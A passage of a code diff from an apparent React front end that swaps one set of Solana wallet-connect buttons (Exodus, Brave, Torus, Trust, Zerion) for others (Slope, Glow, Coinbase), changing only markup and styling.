-                      </div>
-                    </div>
-                  </button>
+                      <button 
+                        onClick={connectSlope} 
+                        className="group relative overflow-hidden bg-gradient-to-br from-green-500/20 to-green-600/20 hover:from-green-500/30 hover:to-green-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-green-400/30 hover:border-green-400/50 hover:scale-105 hover:shadow-xl hover:shadow-green-500/25"
+                      >
+                        <div className="flex flex-col items-center space-y-3">
+                          <div className="w-12 h-12 bg-gradient-to-br from-green-500 to-green-600 rounded-xl flex items-center justify-center shadow-lg">
+                            <span className="text-2xl">🟢</span>
+                          </div>
+                          <div className="text-center">
+                            <div className="font-bold text-lg">Slope</div>
+                            <div className="text-sm text-green-300">Solana</div>
+                          </div>
+                        </div>
+                      </button>
 
-                  <button 
-                    onClick={connectExodus} 
-                    className="group relative overflow-hidden bg-gradient-to-br from-purple-600/20 to-purple-700/20 hover:from-purple-600/30 hover:to-purple-700/30 rounded-2xl p-6 text-white transition-all duration-300 border border-purple-500/30 hover:border-purple-500/50 hover:scale-105 hover:shadow-xl hover:shadow-purple-600/25"
-                  >
-                    <div className="flex flex-col items-center space-y-3">
-                      <div className="w-12 h-12 bg-gradient-to-br from-purple-600 to-purple-700 rounded-xl flex items-center justify-center shadow-lg">
-                        <span className="text-2xl">🟣</span>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-bold text-lg">Exodus</div>
-                        <div className="text-sm text-purple-300">Solana</div>
-                      </div>
-                    </div>
-                  </button>
+                      <button 
+                        onClick={connectGlow} 
+                        className="group relative overflow-hidden bg-gradient-to-br from-yellow-500/20 to-yellow-600/20 hover:from-yellow-500/30 hover:to-yellow-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-yellow-400/30 hover:border-yellow-400/50 hover:scale-105 hover:shadow-xl hover:shadow-yellow-500/25"
+                      >
+                        <div className="flex flex-col items-center space-y-3">
+                          <div className="w-12 h-12 bg-gradient-to-br from-yellow-500 to-yellow-600 rounded-xl flex items-center justify-center shadow-lg">
+                            <span className="text-2xl">🟡</span>
+                          </div>
+                          <div className="text-center">
+                            <div className="font-bold text-lg">Glow</div>
+                            <div className="text-sm text-yellow-300">Solana</div>
+                          </div>
+                        </div>
+                      </button>
 
-                  <button 
-                    onClick={connectBrave} 
-                    className="group relative overflow-hidden bg-gradient-to-br from-orange-600/20 to-orange-700/20 hover:from-orange-600/30 hover:to-orange-700/30 rounded-2xl p-6 text-white transition-all duration-300 border border-orange-500/30 hover:border-orange-500/50 hover:scale-105 hover:shadow-xl hover:shadow-orange-600/25"
-                  >
-                    <div className="flex flex-col items-center space-y-3">
-                      <div className="w-12 h-12 bg-gradient-to-br from-orange-600 to-orange-700 rounded-xl flex items-center justify-center shadow-lg">
-                        <span className="text-2xl">🦁</span>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-bold text-lg">Brave</div>
-                        <div className="text-sm text-orange-300">Solana</div>
-                      </div>
+                      <button 
+                        onClick={connectCoinbase} 
+                        className="group relative overflow-hidden bg-gradient-to-br from-blue-600/20 to-blue-700/20 hover:from-blue-600/30 hover:to-blue-700/30 rounded-2xl p-6 text-white transition-all duration-300 border border-blue-500/30 hover:border-blue-500/50 hover:scale-105 hover:shadow-xl hover:shadow-blue-600/25"
+                      >
+                        <div className="flex flex-col items-center space-y-3">
+                          <div className="w-12 h-12 bg-gradient-to-br from-blue-600 to-blue-700 rounded-xl flex items-center justify-center shadow-lg">
+                            <span className="text-2xl">🔵</span>
+                          </div>
+                          <div className="text-center">
+                            <div className="font-bold text-lg">Coinbase</div>
+                            <div className="text-sm text-blue-300">Solana</div>
+                          </div>
+                        </div>
+                      </button>
                     </div>
-                  </button>
-
-                  <button 
-                    onClick={connectTorus} 
-                    className="group relative overflow-hidden bg-gradient-to-br from-teal-500/20 to-teal-600/20 hover:from-teal-500/30 hover:to-teal-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-teal-400/30 hover:border-teal-400/50 hover:scale-105 hover:shadow-xl hover:shadow-teal-500/25"
-                  >
-                    <div className="flex flex-col items-center space-y-3">
-                      <div className="w-12 h-12 bg-gradient-to-br from-teal-500 to-teal-600 rounded-xl flex items-center justify-center shadow-lg">
-                        <span className="text-2xl">🌀</span>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-bold text-lg">Torus</div>
-                        <div className="text-sm text-teal-300">Solana</div>
-                      </div>
-                    </div>
-                  </button>
-
-                  <button 
-                    onClick={connectTrust} 
-                    className="group relative overflow-hidden bg-gradient-to-br from-blue-700/20 to-blue-800/20 hover:from-blue-700/30 hover:to-blue-800/30 rounded-2xl p-6 text-white transition-all duration-300 border border-blue-600/30 hover:border-blue-600/50 hover:scale-105 hover:shadow-xl hover:shadow-blue-700/25"
-                  >
-                    <div className="flex flex-col items-center space-y-3">
-                      <div className="w-12 h-12 bg-gradient-to-br from-blue-700 to-blue-800 rounded-xl flex items-center justify-center shadow-lg">
-                        <span className="text-2xl">🛡️</span>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-bold text-lg">Trust</div>
-                        <div className="text-sm text-blue-300">Solana</div>
-                      </div>
-                    </div>
-                  </button>
-
-                  <button 
-                    onClick={connectZerion} 
-                    className="group relative overflow-hidden bg-gradient-to-br from-purple-800/20 to-purple-900/20 hover:from-purple-800/30 hover:to-purple-900/30 rounded-2xl p-6 text-white transition-all duration-300 border border-purple-700/30 hover:border-purple-700/50 hover:scale-105 hover:shadow-xl hover:shadow-purple-800/25"
-                  >
-                    <div className="flex flex-col items-center space-y-3">
-                      <div className="w-12 h-12 bg-gradient-to-br from-purple-800 to-purple-900 rounded-xl flex items-center justify-center shadow-lg">
-                        <span className="text-2xl">💰</span>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-bold text-lg">Zerion</div>
-                        <div className="text-sm text-purple-300">Solana</div>
-                      </div>
-                    </div>
-                  </button>
-                </div>
+                  </div>
+                )}
               </div>
             )}
 
